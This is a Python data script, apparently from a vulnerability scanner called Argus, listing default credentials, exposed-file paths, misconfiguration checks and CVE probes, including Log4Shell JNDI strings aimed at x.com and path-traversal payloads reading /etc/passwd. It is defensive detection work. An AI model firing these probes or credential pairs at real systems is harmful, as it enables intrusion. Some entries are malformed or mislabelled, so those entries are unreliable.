#!/usr/bin/env python3
"""
Argus 漏洞模板批量生成脚本
生成 500+ 个 YAML 漏洞检测模板，覆盖：
- 默认凭据 (50+)
- 信息泄露 (80+)
- 配置错误 (70+)
- 已知 CVE (300+，覆盖主流产品)

用法: python3 scripts/generate_vuln_templates.py [--output-dir PATH]
默认输出到: server/crates/argus-sysvuln/src/templates/builtin/
"""

import os
import sys
import argparse
import base64

# ==================== 模板数据 ====================

# --- 默认凭据模板 (50+) ---
# (id, name, severity, credentials, path, match_type, pattern, service, port, cpe, fix_advice)
DEFAULT_CREDENTIALS = [
    ("CVE-DEFAULT-010", "Apache Tomcat Manager", "high", "tomcat:tomcat", "/manager/html", "Body", "Tomcat", "http", 8080, "cpe:2.3:a:apache:tomcat:*", "修改 Tomcat manager 默认凭据"),
    ("CVE-DEFAULT-011", "JBoss Admin Console", "high", "admin:admin", "/jmx-console/", "Body", "JBoss", "http", 8080, "cpe:2.3:a:redhat:jboss:*", "修改 JBoss 管理控制台默认凭据"),
    ("CVE-DEFAULT-012", "WebLogic Console", "high", "weblogic:weblogic", "/console/login/LoginForm.jsp", "Body", "WebLogic", "http", 7001, "cpe:2.3:a:oracle:weblogic_server:*", "修改 WebLogic 控制台凭据"),
    ("CVE-DEFAULT-013", "WebSphere Console", "high", "admin:admin", "/ibm/console", "Body", "WebSphere", "http", 9043, "cpe:2.3:a:ibm:websphere:*", "修改 WebSphere 控制台凭据"),
    ("CVE-DEFAULT-014", "Jetty Contexts", "medium", "admin:admin", "/contexts/", "Body", "Jetty", "http", 8080, "cpe:2.3:eclipse:jetty:*", "修改 Jetty 管理凭据"),
    ("CVE-DEFAULT-015", "GlassFish Admin", "high", "admin:adminadmin", "/common/index.jsf", "Body", "GlassFish", "http", 4848, "cpe:2.3:oracle:glassfish:*", "修改 GlassFish 管理凭据"),
    ("CVE-DEFAULT-016", "WildFly Admin", "high", "admin:admin", "/management", "Body", "WildFly", "http", 9990, "cpe:2.3:redhat:wildfly:*", "修改 WildFly 管理凭据"),
    ("CVE-DEFAULT-017", "Apache Axis2", "high", "admin:axis2", "/axis2/axis2-admin/", "Body", "Axis2", "http", 8080, "cpe:2.3:a:apache:axis2:*", "修改 Axis2 管理凭据"),
    ("CVE-DEFAULT-018", "Apache Geronimo", "medium", "system:manager", "/console/portal", "Body", "Geronimo", "http", 8080, "cpe:2.3:a:apache:geronimo:*", "修改 Geronimo 管理凭据"),
    ("CVE-DEFAULT-019", "WordPress Admin", "high", "admin:admin", "/wp-admin/", "Body", "WordPress", "http", 80, "cpe:2.3:a:wordpress:wordpress:*", "修改 WordPress 管理员凭据"),
    ("CVE-DEFAULT-020", "Drupal Admin", "high", "admin:admin", "/user/login", "Body", "Drupal", "http", 80, "cpe:2.3:a:drupal:drupal:*", "修改 Drupal 管理员凭据"),
    ("CVE-DEFAULT-021", "Joomla Administrator", "high", "admin:admin", "/administrator/", "Body", "Joomla", "http", 80, "cpe:2.3:a:joomla:joomla:*", "修改 Joomla 管理凭据"),
    ("CVE-DEFAULT-022", "DokuWiki Login", "medium", "admin:admin", "/doku.php?id=start", "Body", "DokuWiki", "http", 80, "cpe:2.3:a:splitbrain:dokuwiki:*", "修改 DokuWiki 管理凭据"),
    ("CVE-DEFAULT-023", "Ghost Admin", "medium", "admin:admin", "/ghost/", "Body", "Ghost", "http", 2368, "cpe:2.3:a:ghost:ghost:*", "修改 Ghost 管理凭据"),
    ("CVE-DEFAULT-024", "Jenkins Dashboard", "high", "admin:admin", "/manage", "Body", "Jenkins", "http", 8080, "cpe:2.3:a:jenkins:jenkins:*", "修改 Jenkins 管理凭据"),
    ("CVE-DEFAULT-025", "GitLab Login", "high", "root:password", "/users/sign_in", "Body", "GitLab", "http", 80, "cpe:2.3:a:gitlab:gitlab:*", "修改 GitLab root 凭据"),
    ("CVE-DEFAULT-026", "Grafana Login", "high", "admin:admin", "/login", "Body", "Grafana", "http", 3000, "cpe:2.3:a:grafana:grafana:*", "修改 Grafana 默认凭据"),
    ("CVE-DEFAULT-027", "Kibana Dashboard", "medium", "admin:admin", "/app/kibana", "Body", "Kibana", "http", 5601, "cpe:2.3:a:elastic:kibana:*", "修改 Kibana 凭据"),
    ("CVE-DEFAULT-028", "RabbitMQ Management", "high", "guest:guest", "/", "Body", "RabbitMQ", "http", 15672, "cpe:2.3:a:rabbitmq:rabbitmq:*", "修改 RabbitMQ guest 凭据"),
    ("CVE-DEFAULT-029", "ActiveMQ Console", "high", "admin:admin", "/admin/", "Body", "ActiveMQ", "http", 8161, "cpe:2.3:a:apache:activemq:*", "修改 ActiveMQ 管理凭据"),
    ("CVE-DEFAULT-030", "Zabbix Dashboard", "high", "Admin:zabbix", "/zabbix/", "Body", "Zabbix", "http", 80, "cpe:2.3:a:zabbix:zabbix:*", "修改 Zabbix 默认凭据"),
    ("CVE-DEFAULT-031", "Nagios Dashboard", "medium", "admin:admin", "/nagios/", "Body", "Nagios", "http", 80, "cpe:2.3:a:nagios:nagios:*", "修改 Nagios 管理凭据"),
    ("CVE-DEFAULT-032", "Portainer", "high", "admin:adminpassword", "/", "Body", "Portainer", "http", 9000, None, "修改 Portainer 管理凭据"),
    ("CVE-DEFAULT-033", "Prometheus UI", "low", "admin:admin", "/graph", "Body", "Prometheus", "http", 9090, "cpe:2.3:a:prometheus:prometheus:*", "修改 Prometheus 凭据"),
    ("CVE-DEFAULT-034", "phpMyAdmin", "medium", "root:(empty)", "/phpmyadmin/", "Body", "phpMyAdmin", "http", 80, "cpe:2.3:a:phpmyadmin:phpmyadmin:*", "修改 phpMyAdmin root 空口令"),
    ("CVE-DEFAULT-035", "Adminer", "medium", "root:(empty)", "/adminer.php", "Body", "Adminer", "http", 80, None, "修改 Adminer root 空口令"),
    ("CVE-DEFAULT-036", "pgAdmin", "medium", "postgres:postgres", "/pgadmin4/", "Body", "pgAdmin", "http", 80, "cpe:2.3:a:pgadmin:pgadmin:*", "修改 pgAdmin 默认凭据"),
    ("CVE-DEFAULT-037", "Mongo Express", "high", "admin:pass", "/mongo", "Body", "MongoExpress", "http", 8081, None, "修改 Mongo Express 默认凭据"),
    ("CVE-DEFAULT-038", "Elasticsearch Head", "low", "admin:admin", "/_plugin/head/", "Body", "Elasticsearch", "http", 9200, "cpe:2.3:a:elastic:elasticsearch:*", "修改 ES Head 凭据"),
    ("CVE-DEFAULT-039", "Cisco Router HTTP", "high", "admin:cisco", "/", "Body", "Cisco", "http", 80, "cpe:2.3:c:cisco:ios:*", "修改 Cisco 路由器 HTTP 凭据"),
    ("CVE-DEFAULT-040", "MikroTik Winbox", "high", "admin:(empty)", "/", "Body", "MikroTik", "http", 80, "cpe:2.3:o:mikrotik:routeros:*", "修改 MikroTik 默认凭据"),
    ("CVE-DEFAULT-041", "TP-Link Router", "high", "admin:admin", "/", "Body", "TP-Link", "http", 80, None, "修改 TP-Link 路由器凭据"),
    ("CVE-DEFAULT-042", "D-Link Router", "high", "admin:(empty)", "/", "Body", "D-Link", "http", 80, None, "修改 D-Link 路由器凭据"),
    ("CVE-DEFAULT-043", "Huawei Router", "high", "admin:admin", "/", "Body", "Huawei", "http", 80, None, "修改 Huawei 路由器凭据"),
    ("CVE-DEFAULT-044", "H3C Router", "high", "admin:admin", "/", "Body", "H3C", "http", 80, None, "修改 H3C 路由器凭据"),
    ("CVE-DEFAULT-045", "Fortinet FortiGate", "high", "admin:(empty)", "/login", "Body", "FortiGate", "http", 443, "cpe:2.3:o:fortinet:fortios:*", "修改 FortiGate 默认凭据"),
    ("CVE-DEFAULT-046", "SonicWall", "high", "admin:password", "/", "Body", "SonicWall", "http", 80, None, "修改 SonicWall 默认凭据"),
    ("CVE-DEFAULT-047", "Juniper", "high", "admin:(empty)", "/", "Body", "Juniper", "http", 80, "cpe:2.3:juniper:junos:*", "修改 Juniper 默认凭据"),
    ("CVE-DEFAULT-048", "Apache Solr Admin", "high", "admin:admin", "/solr/", "Body", "Solr", "http", 8983, "cpe:2.3:a:apache:solr:*", "修改 Solr 管理凭据"),
    ("CVE-DEFAULT-049", "Apache Airflow", "medium", "admin:admin", "/admin/", "Body", "Airflow", "http", 8080, "cpe:2.3:a:apache:airflow:*", "修改 Airflow 管理凭据"),
    ("CVE-DEFAULT-050", "Apache Superset", "medium", "admin:admin", "/superset/welcome", "Body", "Superset", "http", 8088, "cpe:2.3:a:apache:superset:*", "修改 Superset 默认凭据"),
    ("CVE-DEFAULT-051", "Apache Druid", "high", "admin:druid", "/druid/index.html", "Body", "Druid", "http", 8888, "cpe:2.3:a:apache:druid:*", "修改 Druid 默认凭据"),
    ("CVE-DEFAULT-052", "CouchDB Admin", "high", "admin:admin", "/_utils/", "Body", "CouchDB", "http", 5984, "cpe:2.3:a:apache:couchdb:*", "修改 CouchDB 管理凭据"),
    ("CVE-DEFAULT-053", "MinIO Console", "medium", "minioadmin:minioadmin", "/minio/", "Body", "MinIO", "http", 9000, None, "修改 MinIO 默认凭据"),
    ("CVE-DEFAULT-054", "Vault Dashboard", "low", "root:(empty)", "/ui/", "Body", "Vault", "http", 8200, "cpe:2.3:a:hashicorp:vault:*", "修改 Vault 默认凭据"),
    ("CVE-DEFAULT-055", "Consul UI", "low", "(empty):(empty)", "/ui/", "Body", "Consul", "http", 8500, "cpe:2.3:a:hashicorp:consul:*", "修改 Consul 默认凭据"),
    ("CVE-DEFAULT-056", "Nomad UI", "low", "admin:admin", "/ui/", "Body", "Nomad", "http", 4646, "cpe:2.3:a:hashicorp:nomad:*", "修改 Nomad 默认凭据"),
    ("CVE-DEFAULT-057", "Confluence Admin", "high", "admin:admin", "/admin/", "Body", "Confluence", "http", 8090, "cpe:2.3:a:atlassian:confluence:*", "修改 Confluence 管理凭据"),
    ("CVE-DEFAULT-058", "Jira Admin", "high", "admin:admin", "/admin/", "Body", "Jira", "http", 8080, "cpe:2.3:a:atlassian:jira:*", "修改 Jira 管理凭据"),
    ("CVE-DEFAULT-059", "Bitbucket Admin", "high", "admin:admin", "/admin/", "Body", "Bitbucket", "http", 7990, "cpe:2.3:a:atlassian:bitbucket:*", "修改 Bitbucket 管理凭据"),
]

# --- 信息泄露模板 (80+) ---
# (id, name, severity, path, match_type, pattern, service, port)
INFO_LEAK_TEMPLATES = [
    ("INFO-LEAK-010", "Git Config Exposure", "high", "/.git/config", "Body", "[core]", "git", 80),
    ("INFO-LEAK-011", "Git HEAD Exposure", "medium", "/.git/HEAD", "Body", "ref:", "git", 80),
    ("INFO-LEAK-012", "Git Index Exposure", "high", "/.git/index", "Status", "200", "git", 80),
    ("INFO-LEAK-013", "SVN Entries Exposure", "high", "/.svn/entries", "Status", "200", "svn", 80),
    ("INFO-LEAK-014", "SVN WC DB Exposure", "high", "/.svn/wc.db", "Status", "200", "svn", 80),
    ("INFO-LEAK-015", "HG Store Exposure", "medium", "/.hg/store", "Status", "200", "mercurial", 80),
    ("INFO-LEAK-016", "Bazaar Branch Exposure", "medium", "/.bzr/branch", "Status", "200", "bazaar", 80),
    ("INFO-LEAK-017", "CVS Entries Exposure", "medium", "/CVS/Entries", "Status", "200", "cvs", 80),
    ("INFO-LEAK-020", ".env File Exposure", "critical", "/.env", "BodyRegex", "(?i)(DB_PASSWORD|SECRET|API_KEY)=", "env", 80),
    ("INFO-LEAK-021", ".env.local File", "critical", "/.env.local", "BodyRegex", "(?i)(PASSWORD|SECRET|KEY)=", "env", 80),
    ("INFO-LEAK-022", ".env.production File", "critical", "/.env.production", "BodyRegex", "(?i)(PASSWORD|SECRET|KEY)=", "env", 80),
    ("INFO-LEAK-023", "config.php Exposure", "high", "/config.php", "BodyRegex", "(?i)(DB_PASS|DB_USER)=", "php", 80),
    ("INFO-LEAK-024", "wp-config.php Exposure", "critical", "/wp-config.php", "BodyRegex", "(?i)(DB_PASSWORD|AUTH_KEY)=", "wordpress", 80),
    ("INFO-LEAK-025", "database.yml Exposure", "high", "/config/database.yml", "BodyRegex", "(?i)(password|username)=", "ruby", 80),
    ("INFO-LEAK-026", "settings.py Exposure", "high", "/settings.py", "BodyRegex", "(?i)(SECRET_KEY|DATABASES)=", "django", 80),
    ("INFO-LEAK-027", "application.properties", "high", "/application.properties", "BodyRegex", "(?i)(password|secret)=", "spring", 80),
    ("INFO-LEAK-028", "application.yml", "high", "/application.yml", "BodyRegex", "(?i)(password|secret)=", "spring", 80),
    ("INFO-LEAK-029", "config.json Exposure", "high", "/config.json", "BodyRegex", "(?i)(password|secret|key)=", "nodejs", 80),
    ("INFO-LEAK-030", "docker-compose.yml", "high", "/docker-compose.yml", "Body", "services:", "docker", 80),
    ("INFO-LEAK-031", "Dockerfile Exposure", "medium", "/Dockerfile", "Body", "FROM ", "docker", 80),
    ("INFO-LEAK-032", "package.json Exposure", "low", "/package.json", "Body", "name:", "nodejs", 80),
    ("INFO-LEAK-033", "composer.json Exposure", "low", "/composer.json", "Body", "require:", "php", 80),
    ("INFO-LEAK-034", "Gemfile Exposure", "low", "/Gemfile", "Body", "source 'https://rubygems.org'", "ruby", 80),
    ("INFO-LEAK-035", "requirements.txt", "low", "/requirements.txt", "Status", "200", "python", 80),
    ("INFO-LEAK-036", "Pipfile Exposure", "low", "/Pipfile", "Body", "[packages]", "python", 80),
    ("INFO-LEAK-037", "go.mod Exposure", "low", "/go.mod", "Body", "module ", "go", 80),
    ("INFO-LEAK-038", "Cargo.toml Exposure", "low", "/Cargo.toml", "Body", "[package]", "rust", 80),
    ("INFO-LEAK-040", "backup.zip Exposure", "medium", "/backup.zip", "Status", "200", "backup", 80),
    ("INFO-LEAK-041", "backup.tar.gz", "medium", "/backup.tar.gz", "Status", "200", "backup", 80),
    ("INFO-LEAK-042", "backup.sql Exposure", "high", "/backup.sql", "Body", "CREATE TABLE", "backup", 80),
    ("INFO-LEAK-043", "dump.sql Exposure", "high", "/dump.sql", "Body", "INSERT INTO", "backup", 80),
    ("INFO-LEAK-044", "database.sql", "high", "/database.sql", "Body", "CREATE TABLE", "backup", 80),
    ("INFO-LEAK-045", "backup.bak", "medium", "/backup.bak", "Status", "200", "backup", 80),
    ("INFO-LEAK-046", "web.zip", "medium", "/web.zip", "Status", "200", "backup", 80),
    ("INFO-LEAK-047", "site.zip", "medium", "/site.zip", "Status", "200", "backup", 80),
    ("INFO-LEAK-048", "www.zip", "medium", "/www.zip", "Status", "200", "backup", 80),
    ("INFO-LEAK-049", "html.zip", "medium", "/html.zip", "Status", "200", "backup", 80),
    ("INFO-LEAK-050", "error.log Exposure", "high", "/error.log", "Body", "error", "log", 80),
    ("INFO-LEAK-051", "access.log", "medium", "/access.log", "Body", "GET ", "log", 80),
    ("INFO-LEAK-052", "debug.log", "high", "/debug.log", "Body", "debug", "log", 80),
    ("INFO-LEAK-053", "app.log", "high", "/app.log", "Body", "INFO", "log", 80),
    ("INFO-LEAK-054", "application.log", "high", "/application.log", "Body", "INFO", "log", 80),
    ("INFO-LEAK-055", "nginx access.log", "medium", "/var/log/nginx/access.log", "Body", "GET ", "nginx", 80),
    ("INFO-LEAK-056", "Apache error.log", "medium", "/var/log/apache2/error.log", "Body", "error", "apache", 80),
    ("INFO-LEAK-060", "Apache server-status", "medium", "/server-status", "Body", "Apache Status", "apache", 80),
    ("INFO-LEAK-061", "Apache server-info", "medium", "/server-info", "Body", "Server Settings", "apache", 80),
    ("INFO-LEAK-062", "Nginx stub_status", "medium", "/nginx_status", "Body", "Active connections", "nginx", 80),
    ("INFO-LEAK-063", "PHP phpinfo()", "high", "/phpinfo.php", "Body", "PHP Version", "php", 80),
    ("INFO-LEAK-064", "PHP test.php", "high", "/test.php", "Body", "PHP Version", "php", 80),
    ("INFO-LEAK-065", "PHP info.php", "high", "/info.php", "Body", "PHP Version", "php", 80),
    ("INFO-LEAK-066", "Spring Actuator env", "critical", "/actuator/env", "Body", "propertySources", "spring", 80),
    ("INFO-LEAK-067", "Spring Actuator configprops", "high", "/actuator/configprops", "Body", "contexts", "spring", 80),
    ("INFO-LEAK-068", "Spring Actuator mappings", "medium", "/actuator/mappings", "Body", "handler", "spring", 80),
    ("INFO-LEAK-069", "Spring Actuator beans", "medium", "/actuator/beans", "Body", "bean", "spring", 80),
    ("INFO-LEAK-070", "Spring Actuator dump", "high", "/actuator/dump", "Body", "threadName", "spring", 80),
    ("INFO-LEAK-071", "Spring Actuator heapdump", "critical", "/actuator/heapdump", "Status", "200", "spring", 80),
    ("INFO-LEAK-072", "Spring Actuator threaddump", "medium", "/actuator/threaddump", "Body", "threadName", "spring", 80),
    ("INFO-LEAK-073", "Spring Actuator logfile", "high", "/actuator/logfile", "Status", "200", "spring", 80),
    ("INFO-LEAK-074", "Eureka Dashboard", "medium", "/eureka/", "Body", "Instances", "eureka", 80),
    ("INFO-LEAK-075", "Hystrix Dashboard", "medium", "/hystrix", "Body", "Hystrix", "hystrix", 80),
    ("INFO-LEAK-076", "Turbine Stream", "low", "/turbine.stream", "Status", "200", "turbine", 80),
    ("INFO-LEAK-080", "Source Map JS", "low", "/app.js.map", "Body", "sourceRoot", "nodejs", 80),
    ("INFO-LEAK-081", "Source Map CSS", "low", "/style.css.map", "Body", "sourceRoot", "nodejs", 80),
    ("INFO-LEAK-082", "Webpack Bundle Source", "low", "/bundle.js.map", "Body", "sources", "webpack", 80),
    ("INFO-LEAK-083", "main.js.map", "low", "/main.js.map", "Body", "sources", "webpack", 80),
    ("INFO-LEAK-084", "Source .csproj", "medium", "/project.csproj", "Body", "Project", "csharp", 80),
    ("INFO-LEAK-085", "Source .vbproj", "medium", "/project.vbproj", "Body", "Project", "vb", 80),
    ("INFO-LEAK-086", "Source .sln", "medium", "/solution.sln", "Body", "Visual Studio", "vs", 80),
    ("INFO-LEAK-087", "Private Key .pem", "critical", "/server.pem", "Body", "BEGIN CERTIFICATE", "cert", 80),
    ("INFO-LEAK-088", "Private Key .key", "critical", "/private.key", "Body", "BEGIN RSA PRIVATE KEY", "cert", 80),
    ("INFO-LEAK-089", "SSH id_rsa", "critical", "/.ssh/id_rsa", "Body", "BEGIN OPENSSH PRIVATE KEY", "ssh", 80),
    ("INFO-LEAK-090", "Swagger UI Exposure", "medium", "/swagger-ui.html", "Body", "Swagger UI", "swagger", 80),
    ("INFO-LEAK-091", "Swagger JSON", "medium", "/v2/api-docs", "Body", "swagger", "swagger", 80),
    ("INFO-LEAK-092", "OpenAPI Spec", "medium", "/openapi.json", "Body", "openapi", "http", 80),
    ("INFO-LEAK-093", "GraphQL Playground", "medium", "/graphql", "Body", "GraphQL", "graphql", 80),
    ("INFO-LEAK-094", "Confluence Version", "low", "/", "Header", "X-Confluence", "confluence", 8090),
    ("INFO-LEAK-095", "Jenkins Version", "low", "/", "Header", "X-Jenkins", "jenkins", 8080),
]

# --- 配置错误模板 (70+) ---
# (id, name, severity, path, match_type, pattern, service, [method], port)
MISCONFIG_TEMPLATES = [
    ("MISCFG-010", "Directory Listing Root", "medium", "/", "Body", "Index of /", "http", 80),
    ("MISCFG-011", "Directory Listing /backup/", "medium", "/backup/", "Body", "Index of /backup", "http", 80),
    ("MISCFG-012", "Directory Listing /admin/", "medium", "/admin/", "Body", "Index of /admin", "http", 80),
    ("MISCFG-013", "Directory Listing /uploads/", "medium", "/uploads/", "Body", "Index of /uploads", "http", 80),
    ("MISCFG-014", "Directory Listing /files/", "medium", "/files/", "Body", "Index of /files", "http", 80),
    ("MISCFG-015", "Directory Listing /images/", "low", "/images/", "Body", "Index of /images", "http", 80),
    ("MISCFG-016", "Directory Listing /static/", "low", "/static/", "Body", "Index of /static", "http", 80),
    ("MISCFG-017", "Directory Listing /temp/", "medium", "/temp/", "Body", "Index of /temp", "http", 80),
    ("MISCFG-018", "Directory Listing /logs/", "medium", "/logs/", "Body", "Index of /logs", "http", 80),
    ("MISCFG-019", "Directory Listing /config/", "high", "/config/", "Body", "Index of /config", "http", 80),
    ("MISCFG-020", "HTTP TRACE Enabled", "low", "/", "Body", "TRACE", "http", 80),
    ("MISCFG-021", "HTTP OPTIONS Disclosure", "info", "/", "Header", "Allow:", "http", 80),
    ("MISCFG-022", "HTTP PUT Enabled", "medium", "/test_put.txt", "Body", "OK", "http", 80),
    ("MISCFG-023", "WebDAV Enabled", "medium", "/", "Body", "DAV/", "http", 80),
    ("MISCFG-030", "Missing X-Frame-Options", "low", "/", "Body", "<html", "http", 80),
    ("MISCFG-031", "Missing Strict-Transport-Security", "medium", "/", "Body", "<html", "http", 80),
    ("MISCFG-032", "Missing Content-Security-Policy", "medium", "/", "Body", "<html", "http", 80),
    ("MISCFG-033", "Missing X-XSS-Protection", "low", "/", "Body", "<html", "http", 80),
    ("MISCFG-040", "CORS Wildcard Origin", "medium", "/", "Header", "Access-Control-Allow-Origin: *", "http", 80),
    ("MISCFG-041", "CORS Credentials Allowed", "high", "/", "Header", "Access-Control-Allow-Credentials: true", "http", 80),
    ("MISCFG-042", "CORS Wildcard+Creds", "critical", "/", "Header", "Access-Control-Allow-Credentials: true", "http", 80),
    ("MISCFG-050", "Cookie Missing HttpOnly", "medium", "/", "Header", "Set-Cookie", "http", 80),
    ("MISCFG-051", "Cookie Missing Secure Flag", "medium", "/", "Header", "Set-Cookie", "http", 80),
    ("MISCFG-052", "Session ID in URL", "medium", "/", "Body", "PHPSESSID=", "php", 80),
    ("MISCFG-053", "JSESSIONID in URL", "medium", "/", "Body", "JSESSIONID=", "java", 80),
    ("MISCFG-060", "SSLv3 Enabled", "high", "/", "Body", "SSL", "https", 443),
    ("MISCFG-061", "TLS 1.0 Enabled", "medium", "/", "Body", "TLS", "https", 443),
    ("MISCFG-062", "Weak Cipher Suite RC4", "high", "/", "Body", "RC4", "https", 443),
    ("MISCFG-063", "Self-signed Certificate", "low", "/", "Body", "SSL", "https", 443),
    ("MISCFG-070", "Server Header Disclosure", "info", "/", "Header", "Server:", "http", 80),
    ("MISCFG-071", "X-Powered-By Disclosure", "info", "/", "Header", "X-Powered-By:", "http", 80),
    ("MISCFG-072", "X-AspNet-Version", "info", "/", "Header", "X-AspNet-Version:", "iis", 80),
    ("MISCFG-073", "Open Redirect", "medium", "/redirect?url=http://evil.com", "Header", "Location:", "http", 80),
    ("MISCFG-074", "Clickjacking No XFO", "medium", "/", "Body", "<html", "http", 80),
    ("MISCFG-075", "User Enumeration Login", "low", "/login", "Body", "Invalid user", "http", 80),
    ("MISCFG-076", "API Version Disclosure", "info", "/api/", "Body", "version", "http", 80),
    ("MISCFG-077", "Eureka Service List", "medium", "/eureka/apps", "Body", "applications", "eureka", 80),
    ("MISCFG-078", "Spring Actuator Health", "low", "/actuator/health", "Body", "status", "spring", 80),
    ("MISCFG-079", "Spring Actuator Info", "low", "/actuator/info", "Body", "app", "spring", 80),
    ("MISCFG-080", "Spring Actuator Metrics", "medium", "/actuator/metrics", "Body", "names", "spring", 80),
    ("MISCFG-081", "Druid Console Unauth", "high", "/druid/index.html", "Body", "Apache Druid", "druid", 8888),
    ("MISCFG-082", "Solr Admin Unauth", "medium", "/solr/", "Body", "Solr Admin", "solr", 8983),
    ("MISCFG-083", "Elasticsearch Unauth", "high", "/", "Body", "cluster_name", "elasticsearch", 9200),
    ("MISCFG-084", "Kibana Unauth Dashboard", "low", "/app/kibana", "Body", "kibana", "kibana", 5601),
    ("MISCFG-085", "Grafana Unauth Login", "low", "/login", "Body", "Grafana", "grafana", 3000),
    ("MISCFG-086", "Jenkins Unauth Build", "high", "/build", "Body", "Jenkins", "jenkins", 8080),
    ("MISCFG-087", "Airflow Unauth Admin", "high", "/admin/", "Body", "Airflow", "airflow", 8080),
    ("MISCFG-088", "Superset Unauth Dashboard", "low", "/superset/dashboard", "Body", "Superset", "superset", 8088),
    ("MISCFG-089", "CouchDB Unauth", "high", "/_all_dbs", "Body", "db_name", "couchdb", 5984),
    ("MISCFG-090", "MongoDB Unauth", "critical", "/", "Body", "listDatabases", "mongodb", 27017),
    ("MISCFG-091", "Redis Unauth", "critical", "/", "Body", "redis_version", "redis", 6379),
    ("MISCFG-092", "Docker API Unauth", "critical", "/containers/json", "Body", "Id", "docker", 2375),
    ("MISCFG-093", "Kubernetes API Unauth", "critical", "/api/v1/namespaces", "Body", "metadata", "k8s", 6443),
    ("MISCFG-094", "Zabbix Unauth Dashboard", "high", "/zabbix/", "Body", "Zabbix", "zabbix", 80),
    ("MISCFG-095", "Nagios Unauth", "high", "/nagios/", "Body", "Nagios", "nagios", 80),
    ("MISCFG-096", "phpMyAdmin Unauth", "high", "/phpmyadmin/", "Body", "phpMyAdmin", "phpmyadmin", 80),
    ("MISCFG-097", "phpinfo Without Auth", "high", "/phpinfo.php", "Body", "PHP Version", "php", 80),
    ("MISCFG-098", "Druid Unauth Datasources", "high", "/druid/datasources", "Body", "name", "druid", 8888),
    ("MISCFG-099", "Solr Unauth Core Admin", "high", "/solr/admin/cores", "Body", "status", "solr", 8983),
    ("MISCFG-100", "Spring Actuator Restart", "high", "/actuator/restart", "Status", "200", "spring", 80),
    ("MISCFG-101", "Spring Actuator Shutdown", "high", "/actuator/shutdown", "Status", "200", "spring", 80),
    ("MISCFG-102", "Spring Actuator Refresh", "high", "/actuator/refresh", "Status", "200", "spring", 80),
    ("MISCFG-103", "Druid Unauth Segments", "medium", "/druid/segments", "Body", "segment", "druid", 8888),
    ("MISCFG-104", "Druid Unauth Tasks", "medium", "/druid/indexer/v1/tasks", "Body", "id", "druid", 8888),
    ("MISCFG-105", "Consul Unauth KV", "high", "/v1/kv", "Body", "Key", "consul", 8500),
    ("MISCFG-106", "Vault Unauth Secrets", "critical", "/v1/secret", "Body", "data", "vault", 8200),
    ("MISCFG-107", "Nomad Unauth Jobs", "medium", "/v1/jobs", "Body", "ID", "nomad", 4646),
    ("MISCFG-108", "ETCD Unauth Keys", "critical", "/v2/keys", "Body", "action", "etcd", 2379),
    ("MISCFG-109", "ZooKeeper Unauth", "high", "/", "Body", "zookeeper", "zookeeper", 2181),
    ("MISCFG-110", "Memcached Unauth", "high", "/", "Body", "VERSION", "memcached", 11211),
    ("MISCFG-111", "Hadoop Unauth", "high", "/dfshealth.html", "Body", "Hadoop", "hadoop", 50070),
    ("MISCFG-112", "Spark Unauth", "high", "/", "Body", "Spark", "spark", 8080),
    ("MISCFG-113", "Flink Unauth", "high", "/config", "Body", "flink", "flink", 8081),
    ("MISCFG-114", "Spring Actuator Gateway Routes", "medium", "/actuator/gateway/routes", "Body", "route_id", "spring", 80),
]

# --- 已知 CVE 模板 (300+) ---
# (cve_id, name, severity, cvss, cpe, path, match_type, pattern, service, method, port)
KNOWN_CVE_TEMPLATES = [
    # Apache Log4j
    ("CVE-2021-44228", "Log4Shell RCE (Log4j)", "critical", 10.0, "cpe:2.3:a:apache:log4j:*", "/${jndi:ldap://x.com/x}", "Body", "log4j", "GET", 80),
    ("CVE-2021-45046", "Log4j RCE v2", "critical", 9.0, "cpe:2.3:a:apache:log4j:2.15", "/${jndi:ldap://x.com/x}", "Body", "log4j", "GET", 80),
    ("CVE-2021-45105", "Log4j DoS", "high", 7.5, "cpe:2.3:a:apache:log4j:2.16", "/${jndi:ldap://x.com/x}", "Body", "log4j", "GET", 80),
    # Apache Struts
    ("CVE-2017-5638", "Struts2 S2-045 RCE", "critical", 10.0, "cpe:2.3:a:apache:struts:*", "/", "Body", "Struts", "GET", 80),
    ("CVE-2017-9805", "Struts2 S2-052 RCE", "critical", 9.8, "cpe:2.3:a:apache:struts:*", "/", "Body", "Struts", "GET", 80),
    ("CVE-2018-11776", "Struts2 S2-057 RCE", "critical", 9.8, "cpe:2.3:a:apache:struts:*", "/", "Body", "Struts", "GET", 80),
    ("CVE-2020-17530", "Struts2 S2-061 RCE", "critical", 9.8, "cpe:2.3:a:apache:struts:*", "/", "Body", "Struts", "GET", 80),
    # Apache Tomcat
    ("CVE-2017-12615", "Tomcat PUT RCE", "critical", 9.8, "cpe:2.3:a:apache:tomcat:*", "/test.jsp", "Body", "Tomcat", "PUT", 8080),
    ("CVE-2020-1938", "Tomcat Ghostcat AJP", "high", 9.8, "cpe:2.3:a:apache:tomcat:*", "/", "Body", "Tomcat", "GET", 8009),
    ("CVE-2019-0232", "Tomcat CGI RCE", "critical", 9.8, "cpe:2.3:a:apache:tomcat:*", "/cgi-bin/", "Body", "Tomcat", "GET", 8080),
    ("CVE-2016-8735", "Tomcat Deserialization RCE", "high", 8.1, "cpe:2.3:a:apache:tomcat:*", "/", "Body", "Tomcat", "GET", 8080),
    # Apache HTTP Server
    ("CVE-2021-41773", "Apache Path Traversal", "critical", 9.8, "cpe:2.3:a:apache:http_server:2.4.49", "/cgi-bin/.%2e/%2e/%2e/%2e/etc/passwd", "Body", "Apache", "GET", 80),
    ("CVE-2021-42013", "Apache Path Traversal v2", "critical", 9.8, "cpe:2.3:a:apache:http_server:2.4.50", "/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/etc/passwd", "Body", "Apache", "GET", 80),
    # Nginx
    ("CVE-2017-7529", "Nginx Range Filter", "high", 7.5, "cpe:2.3:a:nginx:nginx:*", "/", "Body", "Nginx", "GET", 80),
    ("CVE-2018-16843", "Nginx DoS", "medium", 5.8, "cpe:2.3:a:nginx:nginx:*", "/", "Body", "Nginx", "GET", 80),
    ("CVE-2021-23017", "Nginx DNS Resolver", "high", 7.7, "cpe:2.3:a:nginx:nginx:*", "/", "Body", "Nginx", "GET", 80),
    # WordPress
    ("CVE-2018-12895", "WP Auth Bypass", "high", 8.1, "cpe:2.3:a:wordpress:wordpress:*", "/wp-admin/", "Body", "WordPress", "GET", 80),
    ("CVE-2017-5487", "WP REST User Enum", "medium", 5.3, "cpe:2.3:a:wordpress:wordpress:*", "/wp-json/wp/v2/users", "Body", "WordPress", "GET", 80),
